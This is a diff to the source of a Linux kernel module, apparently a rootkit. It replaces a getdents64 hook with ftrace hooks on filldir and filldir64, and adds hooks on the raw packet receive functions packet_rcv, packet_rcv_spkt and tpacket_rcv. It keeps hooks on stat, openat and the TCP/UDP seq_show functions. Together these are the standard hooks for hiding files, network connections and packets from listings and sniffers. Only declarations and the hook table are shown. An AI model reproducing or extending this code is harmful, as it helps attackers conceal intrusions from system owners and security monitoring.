@@ -20,6 +20,9 @@
 #include <uapi/linux/sock_diag.h> 		// SOCK_DIAG_BY_FAMILY
 #include <linux/socket.h>				// struct user_msghdr
 
+#include <linux/ip.h>				// ip_hdr()
+#include <linux/ipv6.h>				// ipv6_hdr()
+
 
 struct ftrace_hook {
 	const char *name;
@@ -35,9 +38,20 @@ struct Extended_array {
     int array_size;
 };
 
-// ------------------------------- getdents ----------------------------------------
-static asmlinkage long (*real_sys_getdents64)(struct pt_regs *regs);
-static asmlinkage long ex_sys_getdents64(struct pt_regs *regs);
+// ------------------------------- filldir ----------------------------------------
+static bool (*real_filldir64)(struct dir_context *ctx, const char *name, int namlen,
+		     loff_t offset, u64 ino, unsigned int d_type);
+static bool ex_filldir64(struct dir_context *ctx, const char *name, int namlen,
+		     loff_t offset, u64 ino, unsigned int d_type);
+
+static bool (*real_filldir)(struct dir_context *ctx, const char *name, int namlen,
+		     loff_t offset, u64 ino, unsigned int d_type);
+static bool ex_filldir(struct dir_context *ctx, const char *name, int namlen,
+		     loff_t offset, u64 ino, unsigned int d_type);
+
+
+// static asmlinkage long (*real_sys_getdents64)(struct pt_regs *regs);
+// static asmlinkage long ex_sys_getdents64(struct pt_regs *regs);
 // --------------------------------------------------------------------------------
 
 // ------------------------------- stat -------------------------------------------
@@ -80,9 +94,22 @@ static asmlinkage long ex_sys_openat2(struct pt_regs *regs);
 
 // static asmlinkage long (*real_sys_recvmsg)(struct pt_regs *regs);
 // static asmlinkage long ex_sys_recvmsg(struct pt_regs *regs);
+
 // --------------------------------------------------------------------------------
 
 // ------------------------------- socket -----------------------------------------
+// packet_rcv packet_rcv_spkt tpacket_rcv linux-source-6.11/net/packet/af_packet.c
+// struct sk_buff - linux-headers-6.11.2-common/include/linux/skbuff.h
+
+static int (*real_packet_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
+static int ex_packet_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
+
+static int (*real_packet_rcv_spkt)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
+static int ex_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
+
+static int (*real_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
+static int ex_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
+
 static asmlinkage long (*real_tcp4_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage long ex_tcp4_seq_show(struct seq_file *seq, void *v);
 
@@ -115,7 +142,11 @@ static asmlinkage long ex_udp6_seq_show(struct seq_file *seq, void *v);
 	}
 
 static struct ftrace_hook EX_hooks[] = {
-	SYS_HOOK("sys_getdents64", ex_sys_getdents64, &real_sys_getdents64),
+	HOOK("filldir64", ex_filldir64, &real_filldir64),
+	HOOK("filldir", ex_filldir, &real_filldir),
+
+
+	// SYS_HOOK("sys_getdents64", ex_sys_getdents64, &real_sys_getdents64),
 
 	// !sys_stat64 sys_lstat64 ??
 	SYS_HOOK("sys_stat", ex_sys_stat, &real_sys_stat),
@@ -129,8 +160,12 @@ static struct ftrace_hook EX_hooks[] = {
 	SYS_HOOK("sys_openat", ex_sys_openat, &real_sys_openat),
 	SYS_HOOK("sys_openat2", ex_sys_openat2, &real_sys_openat2),
 
-	// HOOK("sys_recvfrom", ex_sys_recvfrom, &real_sys_recvfrom),
 	// SYS_HOOK("sys_recvmsg", ex_sys_recvmsg, &real_sys_recvmsg),
+
+	HOOK("packet_rcv", ex_packet_rcv, &real_packet_rcv),
+	HOOK("packet_rcv_spkt", ex_packet_rcv_spkt, &real_packet_rcv_spkt),
+	HOOK("tpacket_rcv", ex_tpacket_rcv, &real_tpacket_rcv),
+
 	HOOK("tcp4_seq_show", ex_tcp4_seq_show, &real_tcp4_seq_show),
 	HOOK("tcp6_seq_show", ex_tcp6_seq_show, &real_tcp6_seq_show),
 	HOOK("udp4_seq_show", ex_udp4_seq_show, &real_udp4_seq_show),
